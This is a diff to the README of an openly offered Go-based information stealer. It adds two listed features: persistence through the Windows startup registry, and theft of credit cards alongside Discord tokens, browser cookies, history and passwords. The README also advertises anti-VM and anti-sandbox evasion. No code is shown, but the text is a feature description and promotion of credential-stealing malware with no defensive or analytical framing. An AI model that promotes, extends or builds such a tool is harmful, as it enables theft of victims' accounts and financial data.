@@ -9,9 +9,10 @@ A stealer made with Go, for its simplicity and cross-compilation capabilities.
 
 - Anti-VM and Anti-Sandbox techniques.
 - VERY lightweight file size (2MB), thanks to Go being a compiled language
+- Can auto-add itself to startup via registry
 - Steals:
   - Discord tokens
-  - Browser cookies, history, passwords
+  - Browser cookies, history, passwords, credit cards
 
 ## Building
 
